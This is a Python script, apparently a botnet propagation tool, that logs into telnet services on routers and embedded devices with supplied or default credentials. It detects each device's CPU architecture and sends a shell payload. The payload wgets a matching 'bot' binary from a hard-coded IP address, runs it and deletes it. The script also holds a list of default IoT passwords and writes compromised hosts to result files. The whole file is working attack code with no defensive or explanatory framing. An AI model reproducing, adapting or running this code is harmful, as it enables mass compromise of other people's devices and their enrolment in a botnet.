#!/usr/bin/env python3

import socket
import concurrent.futures
import time
import sys
import re
import os
import signal
import threading
import queue
import random
from datetime import datetime
from collections import defaultdict

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'

USE_COLORS = hasattr(sys.stdout, 'isatty') and sys.stdout.isatty()

LOGIN_PROMPTS = [
    b'login:', b'username:', b'user:', b'account:', b'Login:', b'Username:',
    b'User:', b'LOGIN:', b'USERNAME:', b'USER:', b'login :', b'username :',
    b'user :', b'login>', b'username>', b'user>', b'Enter username:',
    b'Please login:', b'Authentication required', b'Name:', b'ID:',
    b'id:', b'Login ID:', b'User ID:', b'access:', b'auth:',
    b'login: ', b'username: ', b'user: ', b'account: ',
    b'zlm60 login:', b'PBOC login:', b'ZLM login:', b'ZTE login:',
    b'Huawei login:', b'cisco login:', b'Router login:', b'Switch login:',
    b'Device login:', b'Sysadmin login:', b'Admin login:', b'root login:',
    b'login:', b'user login:', b'console login:', b'serial login:',
]

PASSWORD_PROMPTS = [
    b'password:', b'Password:', b'PASSWORD:', b'pass:', b'Pass:',
    b'password :', b'Password :', b'PASS:', b'enter password:',
    b'Enter Password:', b'Please enter password:', b'passwd:',
    b'Passwd:', b'password>', b'Password>', b'secret:', b'Secret:',
    b'PWD:', b'pwd:', b'Password: ', b'pass: ', b'secret: ',
    b'Password: ', b'password: ', b'Pass: ', b'pass: ',
    b'Enter Password:', b'Enter password:', b'Input password:',
    b'Please input password:', b'Auth Password:', b'System Password:',
]

SHELL_PROMPTS = [
    b'$', b'#', b'>', b'%', b']$', b']#', b':~$', b':~#', b'/#', b'/ $',
    b'# ', b'$ ', b'> ', b'% ', b'~ $', b'~ #', b'bash$', b'bash#',
    b'sh$', b'sh#', b'root@', b'user@', b'@localhost', b'busybox$',
    b'busybox#', b'/>', b'\\>', b'command>', b'shell>', b'cli>',
    b']\\$', b']\\#', b'}:~$', b'}:~#', b'# ', b'\\$ ', b'\\# ',
    b'/> ', b'\\> ', b'~\\$', b'~\\#', b'\\$\\$', b'#\\$',
    b'~ $', b'~ #', b'/# ', b'/ #', b'$ ', b'# ', b'> ', b'% ',
    b'root:', b'user:', b'admin:', b'guest:',
]

BANNER_PROMPTS = [
    b'Welcome to', b'Linux', b'QTerm', b'PBOC', b'ZLM', b'ZTE', b'Huawei',
    b'Cisco', b'Router', b'Switch', b'Device', b'Gateway', b'ONT', b'ONU',
    b'FiberHome', b'Zyxel', b'D-Link', b'TP-Link', b'Netgear', b'Asus',
    b'MikroTik', b'Ubiquiti', b'OpenWrt', b'DD-WRT', b'Tomato', b'BusyBox',
    b'Kernel', b'QTerm v', b'ZLM60', b'PBOC Terminal', b'Linux for MIPS',
    b'Linux for ARM', b'Linux for x86', b'Embedded Linux',
]

VENDOR_PROMPTS = {
    'ZTE_ZLM': [b'ZLM60', b'zlm60', b'ZTE ZLM', b'ZTE Linux', b'ZTE Router'],
    'ZTE': [b'ZTE>', b'ZTE#', b'ZXHN>', b'ZXHN#', b'F660>', b'F660#', b'ZXV10>'],
    'Huawei': [b'Huawei>', b'Huawei#', b'HG8245>', b'EchoLife>', b'MA5600>', b'SmartAX>'],
    'MikroTik': [b'MikroTik>', b'MikroTik#', b'[admin@MikroTik]', b'RouterOS'],
    'Cisco': [b'cisco>', b'cisco#', b'Router>', b'Router#', b'Switch>', b'Switch#', b'ios>'],
    'PBOC_Terminal': [b'PBOC', b'QTerm', b'PBOC login', b'PBOC Terminal'],
    'FiberHome': [b'FiberHome>', b'FiberHome#', b'AN5506>', b'AN5506#'],
    'Zyxel': [b'ZyXEL>', b'ZyXEL#', b'ras>', b'ras#', b'ZySH>'],
    'D-Link': [b'D-Link>', b'D-Link#', b'Dlink>', b'Dlink#', b'DSL>'],
    'TP-Link': [b'TP-Link>', b'TP-Link#', b'Tplink>', b'Tplink#', b'TL>'],
    'Netgear': [b'NETGEAR>', b'NETGEAR#', b'Netgear>', b'Netgear#'],
    'Asus': [b'ASUS>', b'ASUS#', b'Asus>', b'Asus#', b'RT>', b'Asuswrt>'],
    'Ubiquiti': [b'UBNT>', b'UBNT#', b'AirOS>', b'EdgeOS>', b'ubnt>'],
    'OpenWrt': [b'OpenWrt>', b'OpenWrt#', b'root@OpenWrt', b'BusyBox'],
    'DD_WRT': [b'DD-WRT>', b'DD-WRT#', b'dd-wrt>', b'dd-wrt#'],
    'FriendlyELEC': [b'NanoPi>', b'NanoPi#', b'FriendlyELEC'],
    'RaspberryPi': [b'raspberrypi', b'Raspbian', b'RPi>', b'RPi#'],
}

CREDENTIALS = [
    ('root', ''), ('root', 'root'), ('root', 'admin'), ('admin', 'admin'),
    ('admin', ''), ('admin', 'password'), ('user', 'user'), ('guest', 'guest'),
    ('root', '12345'), ('admin', '12345'), ('root', 'default'), ('admin', 'default'),
    ('root', 'password'), ('root', '123456'), ('admin', '123456'), ('support', 'support'),
    ('root', 'Zte521'), ('admin', 'Zte521'), ('root', 'vizxv'), ('root', 'xc3511'),
    ('root', '1234'), ('admin', '1234'), ('root', 'klv123'), ('admin', 'klv123'),
    ('root', '7ujMko0admin'), ('admin', '7ujMko0admin'), ('root', 'system'), ('admin', 'system'),
    ('root', '888888'), ('admin', '888888'), ('root', '123123'), ('admin', '123123'),
    ('root', 'toor'), ('admin', 'toor'), ('root', 'root123'), ('admin', 'root123'),
    ('root', 'password123'), ('admin', 'password123'), ('root', 'qwerty'), ('admin', 'qwerty'),
    ('root', '1q2w3e4r'), ('admin', '1q2w3e4r'), ('root', '1qaz2wsx'), ('admin', '1qaz2wsx'),
    ('root', 'zlm60'), ('admin', 'zlm60'), ('root', 'pboc'), ('admin', 'pboc'),
    ('root', 'qterm'), ('admin', 'qterm'), ('root', 'terminal'), ('admin', 'terminal'),
    ('root', 'ZLM60'), ('admin', 'ZLM60'), ('root', 'PBOC'), ('admin', 'PBOC'),
]

PAYLOAD = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://62.171.142.33/luxzzxzzx/luxzz.mpsl -O bot; chmod 777 bot; ./bot; rm -rf bot"

def log_success(msg):
    if USE_COLORS:
        print(f"{Colors.GREEN}{Colors.BOLD}[+]{Colors.RESET} {Colors.GREEN}{msg}{Colors.RESET}")
    else:
        print(f"[+] {msg}")
    sys.stdout.flush()

def log_failed(msg):
    if USE_COLORS:
        print(f"{Colors.RED}{Colors.BOLD}[-]{Colors.RESET} {Colors.RED}{msg}{Colors.RESET}")
    else:
        print(f"[-] {msg}")
    sys.stdout.flush()

def log_info(msg):
    if USE_COLORS:
        print(f"{Colors.CYAN}[*]{Colors.RESET} {Colors.WHITE}{msg}{Colors.RESET}")
    else:
        print(f"[*] {msg}")
    sys.stdout.flush()

def log_warning(msg):
    if USE_COLORS:
        print(f"{Colors.YELLOW}[!]{Colors.RESET} {Colors.YELLOW}{msg}{Colors.RESET}")
    else:
        print(f"[!] {msg}")
    sys.stdout.flush()

def parse_targets(filename):
    targets = []
    invalid = 0
    duplicates = set()
    
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            for line_num, line in enumerate(f, 1):
                line = line.strip()
                
                if not line or line.startswith('#'):
                    continue
                
                parts = line.split()
                if len(parts) < 2:
                    invalid += 1
                    continue
                
                ip_port = parts[0]
                user_pass = parts[1]
                
                if ':' not in ip_port:
                    invalid += 1
                    continue
                
                ip, port_str = ip_port.split(':', 1)
                try:
                    port = int(port_str)
                    if port < 1 or port > 65535:
                        port = 23
                except:
                    port = 23
                
                if ':' not in user_pass:
                    username = user_pass
                    password = ""
                else:
                    username, password = user_pass.split(':', 1)
                
                key = f"{ip}:{port}"
                if key not in duplicates:
                    duplicates.add(key)
                    targets.append({
                        'ip': ip,
                        'port': port,
                        'username': username,
                        'password': password,
                        'raw': line
                    })
        
        log_info(f"Loaded {len(targets)} targets from {filename}")
        if invalid > 0:
            log_warning(f"Skipped {invalid} invalid lines")
        
        return targets
        
    except FileNotFoundError:
        log_failed(f"File {filename} not found!")
        return []
    except Exception as e:
        log_failed(f"Error reading file: {e}")
        return []

def detect_banner(data):
    banner = ""
    try:
        for line in data.split(b'\n')[:5]:
            if line:
                banner += line.decode('ascii', errors='ignore') + " "
    except:
        pass
    return banner.strip()

def detect_vendor_from_banner(banner):
    banner_lower = banner.lower()
    
    for vendor, prompts in VENDOR_PROMPTS.items():
        for prompt in prompts:
            if prompt.lower() in banner_lower:
                return vendor
    
    if 'qterm' in banner_lower:
        return 'PBOC_Terminal'
    elif 'zlm60' in banner_lower:
        return 'ZTE_ZLM'
    elif 'linux for mips' in banner_lower:
        return 'ZTE_ZLM'
    elif 'linux for arm' in banner_lower:
        return 'Embedded_Linux'
    elif 'welcome to' in banner_lower:
        return 'Linux_Device'
    
    return "Unknown"

def telnet_connect(ip, port, username, password, timeout=7):
    sock = None
    banner_info = ""
    vendor = "Unknown"
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        
        sock.settimeout(3)
        banner_data = b''
        try:
            banner_data = sock.recv(8192)
            banner_info = detect_banner(banner_data)
            vendor = detect_vendor_from_banner(banner_info)
        except:
            pass
        
        sock.settimeout(3)
        
        login_sent = False
        for prompt in LOGIN_PROMPTS:
            if prompt.lower() in banner_data.lower():
                sock.send(username.encode() + b'\n')
                login_sent = True
                break
        
        if not login_sent:
            sock.send(username.encode() + b'\n')
        
        time.sleep(0.5)
        password_data = b''
        try:
            password_data = sock.recv(4096)
        except:
            pass
        
        pass_sent = False
        for prompt in PASSWORD_PROMPTS:
            if prompt.lower() in password_data.lower():
                sock.send(password.encode() + b'\n')
                pass_sent = True
                break
        
        if not pass_sent:
            sock.send(password.encode() + b'\n')
        
        time.sleep(1)
        shell_data = b''
        
        for _ in range(5):
            try:
                sock.send(b'\n')
                time.sleep(0.3)
                shell_data += sock.recv(8192)
            except:
                pass
        
        for prompt in SHELL_PROMPTS:
            if prompt.lower() in shell_data.lower():
                return True, sock, vendor, banner_info
        
        sock.close()
        return False, None, vendor, banner_info
        
    except socket.timeout:
        if sock:
            sock.close()
        return False, None, vendor, banner_info
    except ConnectionRefusedError:
        if sock:
            sock.close()
        return False, None, vendor, banner_info
    except Exception:
        if sock:
            sock.close()
        return False, None, vendor, banner_info

def get_architecture(sock):
    arch_commands = ['uname -m', 'uname -a', 'cat /proc/version', 'arch', 'echo $MACHTYPE']
    
    for cmd in arch_commands:
        try:
            sock.send(cmd.encode() + b'\n')
            time.sleep(0.5)
            data = sock.recv(4096).decode('ascii', errors='ignore').lower()
            
            if 'aarch64' in data or 'arm64' in data:
                return 'aarch64'
            elif 'armv7' in data or 'arm7' in data:
                return 'armv7'
            elif 'armv6' in data or 'arm6' in data:
                return 'armv6'
            elif 'armv5' in data or 'arm5' in data:
                return 'armv5'
            elif 'arm' in data:
                return 'arm'
            elif 'mips64' in data:
                return 'mips64'
            elif 'mips' in data and 'mipsel' not in data:
                return 'mips'
            elif 'mipsel' in data:
                return 'mipsel'
            elif 'x86_64' in data or 'amd64' in data:
                return 'x86_64'
            elif 'i686' in data or 'i586' in data or 'i386' in data:
                return 'x86'
            elif 'sh4' in data:
                return 'sh4'
            elif 'ppc64' in data:
                return 'ppc64'
            elif 'ppc' in data:
                return 'ppc'
            elif 'riscv64' in data:
                return 'riscv64'
        except:
            continue
    
    return 'mips'

def execute_payload(sock, arch, vendor):
    arch_payloads = {
        'aarch64': PAYLOAD.replace('luxzz.mpsl', 'luxzz.aarch64'),
        'armv7': PAYLOAD.replace('luxzz.mpsl', 'luxzz.armv7'),
        'armv6': PAYLOAD.replace('luxzz.mpsl', 'luxzz.armv6'),
        'armv5': PAYLOAD.replace('luxzz.mpsl', 'luxzz.armv5'),
        'arm': PAYLOAD.replace('luxzz.mpsl', 'luxzz.arm'),
        'mips64': PAYLOAD.replace('luxzz.mpsl', 'luxzz.mips64'),
        'mips': PAYLOAD.replace('luxzz.mpsl', 'luxzz.mpsl'),
        'mipsel': PAYLOAD.replace('luxzz.mpsl', 'luxzz.mpsel'),
        'x86_64': PAYLOAD.replace('luxzz.mpsl', 'luxzz.x86_64'),
        'x86': PAYLOAD.replace('luxzz.mpsl', 'luxzz.x86'),
        'sh4': PAYLOAD.replace('luxzz.mpsl', 'luxzz.sh4'),
        'ppc64': PAYLOAD.replace('luxzz.mpsl', 'luxzz.ppc64'),
        'ppc': PAYLOAD.replace('luxzz.mpsl', 'luxzz.ppc'),
    }
    
    final_payload = arch_payloads.get(arch, PAYLOAD)
    
    try:
        sock.send(b'\n')
        time.sleep(0.3)
        sock.send(final_payload.encode() + b'\n')
        time.sleep(2)
        return True
    except:
        try:
            sock.send(PAYLOAD.encode() + b'\n')
            time.sleep(2)
            return True
        except:
            return False

def process_target(target, results_queue, stats):
    ip = target['ip']
    port = target['port']
    username = target['username']
    password = target['password']
    
    try:
        success, sock, vendor, banner = telnet_connect(ip, port, username, password)
        
        if success:
            arch = get_architecture(sock)
            payload_ok = execute_payload(sock, arch, vendor)
            
            result = {
                'ip': ip,
                'port': port,
                'username': username,
                'password': password,
                'vendor': vendor,
                'arch': arch,
                'payload': payload_ok,
                'banner': banner,
                'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }
            
            results_queue.put(result)
            stats['success'] += 1
            
            payload_status = " ✓" if payload_ok else " ✗"
            log_success(f"{ip}:{port} | {vendor} | {arch} | {username}:{password}{payload_status}")
            
            if banner:
                log_info(f"    Banner: {banner[:80]}")
            
            try:
                sock.close()
            except:
                pass
        else:
            stats['failed'] += 1
            log_failed(f"{ip}:{port} | {username}:{password} | {vendor}")
            
    except Exception as e:
        stats['failed'] += 1
        log_failed(f"{ip}:{port} | Error: {str(e)[:30]}")
        stats['errors'] += 1

def save_results(results, filename="hasil_sukses.txt"):
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("# Telnet Auto Login Results\n")
            f.write(f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# Total Success: {len(results)}\n")
            f.write("#" + "="*80 + "\n\n")
            f.write("# Format: IP:PORT VENDOR ARCH USERNAME:PASSWORD PAYLOAD_STATUS\n\n")
            
            for r in results:
                payload_status = "PAYLOAD_OK" if r.get('payload', False) else "PAYLOAD_FAILED"
                f.write(f"{r['ip']}:{r['port']} {r['vendor']} {r['arch']} {r['username']}:{r['password']} {payload_status}\n")
                if r.get('banner'):
                    f.write(f"# Banner: {r['banner']}\n")
        
        log_info(f"Saved {len(results)} results to {filename}")
        
        with open("hasil_sukses_simple.txt", 'w', encoding='utf-8') as f:
            for r in results:
                f.write(f"{r['ip']}:{r['port']}\n")
        
        return True
    except Exception as e:
        log_warning(f"Failed to save results: {e}")
        return False

def print_banner():
    banner = f"""
{Colors.MAGENTA}{Colors.BOLD}
╔════════════════════════════════════════════════════════════════════════════════╗
║                    TELNET AUTO LOGIN EXECUTOR - ULTIMATE EDITION               ║
║                                                                                ║
║  Features:                                                                     ║
║  - Supports ZLM60, PBOC, QTerm, and various Linux devices                     ║
║  - Auto detect login prompts (random/vendor specific)                         ║
║  - Multi-threaded (up to 500 concurrent)                                      ║
║  - Auto detect router vendors (ZTE, Huawei, Cisco, PBOC, etc)                ║
║  - Architecture detection (uname -m)                                          ║
║  - Automatic payload execution                                                ║
║  - Banner detection and logging                                               ║
║                                                                                ║
╚════════════════════════════════════════════════════════════════════════════════╝
{Colors.RESET}
"""
    print(banner)

def main():
    print_banner()
    
    if len(sys.argv) > 1:
        filename = sys.argv[1]
    elif os.path.exists("all.txt"):
        filename = "all.txt"
    else:
        log_failed("No input file found!")
        log_info("Usage: python3 telnet.py all.txt")
        log_info("Format all.txt: IP:PORT USERNAME:PASSWORD")
        log_info("Example: 192.168.1.1:23 root:admin")
        log_info("Example: 10.0.0.1:2323 admin:password")
        return
    
    targets = parse_targets(filename)
    if not targets:
        log_failed("No valid targets loaded!")
        return
    
    max_workers = min(500, len(targets))
    log_info(f"Total targets: {len(targets)}")
    log_info(f"Thread pool: {max_workers}")
    log_info(f"Credentials: {len(CREDENTIALS)} patterns")
    log_info("Starting attack...\n")
    
    results_queue = queue.Queue()
    stats = {'success': 0, 'failed': 0, 'errors': 0}
    results = []
    
    start_time = time.time()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for target in targets:
            future = executor.submit(process_target, target, results_queue, stats)
            futures.append(future)
        
        completed = 0
        while completed < len(futures):
            try:
                result = results_queue.get(timeout=1)
                if result:
                    results.append(result)
                completed += 1
                
                if completed % 50 == 0 or completed == len(futures):
                    elapsed = time.time() - start_time
                    rate = completed / elapsed if elapsed > 0 else 0
                    eta = (len(targets) - completed) / rate if rate > 0 else 0
                    
                    progress = (completed / len(targets)) * 100
                    bar_len = 30
                    filled = int(bar_len * completed // len(targets))
                    bar = '█' * filled + '░' * (bar_len - filled)
                    
                    log_info(f"[{bar}] {progress:.1f}% | {completed}/{len(targets)} | "
                            f"Rate: {rate:.1f}/s | ETA: {eta:.0f}s | Success: {len(results)}")
                    
            except queue.Empty:
                continue
    
    elapsed = time.time() - start_time
    
    print("\n" + "="*70)
    log_info("SCAN COMPLETE")
    log_info(f"Total targets: {len(targets)}")
    log_info(f"Successful: {len(results)}")
    log_info(f"Failed: {len(targets) - len(results)}")
    log_info(f"Success rate: {(len(results)/len(targets)*100):.2f}%")
    log_info(f"Time: {elapsed:.1f}s | Speed: {len(targets)/elapsed:.1f} targets/s")
    print("="*70)
    
    if results:
        save_results(results)
        
        payload_ok = sum(1 for r in results if r.get('payload', False))
        log_success(f"Payload executed on {payload_ok} devices")
        
        vendors = defaultdict(int)
        for r in results:
            vendors[r.get('vendor', 'Unknown')] += 1
        
        if vendors:
            log_info("\nVendor breakdown:")
            for vendor, count in sorted(vendors.items(), key=lambda x: x[1], reverse=True):
                log_info(f"  {vendor}: {count}")
    
    print(f"\n{Colors.GREEN}{Colors.BOLD}DONE! Results saved to hasil_sukses.txt{Colors.RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n")
        log_warning("Interrupted by user")
        sys.exit(130)
    except Exception as e:
        log_failed(f"Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
